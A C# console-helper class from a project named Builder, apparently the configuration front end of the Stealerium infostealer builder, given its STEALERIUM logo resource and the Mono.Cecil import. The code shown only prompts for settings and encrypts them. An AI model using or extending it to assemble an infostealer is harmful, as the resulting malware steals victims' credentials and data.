using Mono.Cecil;
using Spectre.Console;

namespace Builder.Modules;

internal sealed class Cli
{
    public static string GetBoolValue(string text)
    {
        var prompt = new TextPrompt<string>($"[bold yellow](?)[/] {text} [white](y/n):[/]")
            .AllowEmpty();

        string result = AnsiConsole.Prompt(prompt);
        return result.ToUpper() == "Y" ? "1" : "0";
    }

    public static string? GetStringValue(string text)
    {
        var prompt = new TextPrompt<string>($"[bold yellow](?)[/] [red]{text}[/]\n>>> ")
            .AllowEmpty();

        return AnsiConsole.Prompt(prompt);
    }

    public static string GetEncryptedString(string text)
    {
        var result = GetStringValue(text);
        return !string.IsNullOrEmpty(result) ? Crypt.EncryptConfig(result) : "";
    }

    public static void ShowError(string text)
    {
        AnsiConsole.MarkupLine("[red](!) {0}[/]", text);
        AnsiConsole.Write(new Markup("Press any key to exit..."));
        Console.ReadKey();
        Environment.Exit(1);
    }

    public static void ShowInfo(string text)
    {
        AnsiConsole.MarkupLine("[yellow](i) {0}[/]", text);
    }

    public static void ShowSuccess(string text)
    {
        AnsiConsole.MarkupLine("[green](+) {0}[/]", text);
    }

    public static void ShowLogo()
    {
        var image = new CanvasImage(Properties.Resources.STEALERIUM);
        AnsiConsole.Write(image);
    }
}
